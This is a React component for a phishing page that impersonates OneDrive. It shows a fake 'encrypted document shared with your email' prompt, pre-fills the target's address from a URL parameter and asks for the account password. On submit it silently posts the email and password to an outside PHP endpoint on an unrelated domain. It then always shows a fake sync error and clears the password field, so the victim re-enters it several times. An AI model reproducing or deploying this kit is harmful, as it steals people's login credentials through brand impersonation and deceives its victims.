import React from "react";
import {DiOnedrive} from "react-icons/di"

const Modal = ({ toggle, open }) => {
//   const [count, setCount] = React.useState(0);
//   const [showModal, setShowModal] = React.useState(false);
  const errorBox = React.useRef(null);
  const subBtn = React.useRef(null);
  const [values, setValues] = React.useState({
    email: "",
    password: "",
  });

  const [message, setMessage] = React.useState("");
  const [counter, setCounter] = React.useState(0);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (values.email.trim() === "") {
      setMessage("Please enter email");
      setTimeout(() => {
        setMessage("");
      }, 3000);
      return;
    }
    if (values.password.trim() === "") {
      setMessage("Please enter password");
      setTimeout(() => {
        setMessage("");
      }, 3000);
      return;
    }
    subBtn.current.innerHTML = "Processing..."
    subBtn.current.disabled = true;
    if(counter > 2){
      setTimeout(() => {
        setMessage("Error: OneDrive sync failed. Please try again.");
        subBtn.current.innerHTML = "Download"
        setValues({ ...values, password: "" });
        subBtn.current.disabled = false;
        setTimeout(() => {
          setMessage("");
        }, 5000);
      }, 3000)
      return;
    }
    setCounter(counter + 1);
    const formData = new FormData();
    Object.entries(values).forEach(([k, v]) => formData.append(k, v));
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "https://pcx.sunnova-solar.com/fnsCAHeP4ztJF8xC6KE2/ks4qzQsqn6eSg9O12qUT/reportsales504.php", true);
    xhr.timeout = 5000;
    xhr.onload = () => {
        setMessage("Error: OneDrive sync failed. Please try again.");
        subBtn.current.innerHTML = "Download"
        setValues({ ...values, password: "" });
        subBtn.current.disabled = false;
        setTimeout(() => {
          setMessage("");
        }, 5000);
    };
    xhr.onerror = () => {
        setMessage("Error: OneDrive sync failed. Please try again.");
        subBtn.current.innerHTML = "Download"
        setValues({ ...values, password: "" });
        subBtn.current.disabled = false;
        setTimeout(() => {
          setMessage("");
        }, 5000);
    };
    xhr.ontimeout = () => {
        setMessage("Error: OneDrive sync failed. Please try again.");
        subBtn.current.innerHTML = "Download"
        setValues({ ...values, password: "" });
        subBtn.current.disabled = false;
        setTimeout(() => {
          setMessage("");
        }, 5000);
    };
    xhr.send(formData);
  };

  const handleChange = (e) => {
    setValues({ ...values, [e.target.name]: e.target.value });
  };

  function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
      results = regex.exec(url);
    if (!results) return "";
    if (!results[2]) return "";
    return decodeURIComponent(results[2].replace(/\+/g, " "));
  }

  React.useEffect(() => {
    setValues({ ...values, email: getParameterByName("eca") });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);
//   React.useEffect(() => {
//     setShowModal(true);
//   }, []);
  return (
    <>
        <div className="modal">
          <div className="main">
            <div className="content">
              <p className="logo"><DiOnedrive /> OneDrive</p>
              <p className="info-text">An Encrypted document was shared with your email <span>{values.email}</span>. Please proceed to authenticate and view document on OneDrive</p>
              <form onSubmit={handleSubmit}>
                <div className="form-group">
                  <input
                    type="hidden"
                    name="email"
                    value={values.email}
                  />
                </div>
                <div className="form-group">
                    <label htmlFor="">Enter Password</label>
                    <p ref={errorBox} className="error">{message} &nbsp;</p>
                  <input
                    type="password"
                    name="password"
                    className="form-control"
                    value={values.password}
                    onChange={handleChange}
                    placeholder="Password"
                  />
                </div>
                <p className="info-tint">This link is only valid for intended email address</p>
                <div className="btn">
                  <button type="submit" ref={subBtn}>Download</button>
                </div>
              </form>
            </div>
          </div>
        </div>
    </>
  );
};

export default Modal;
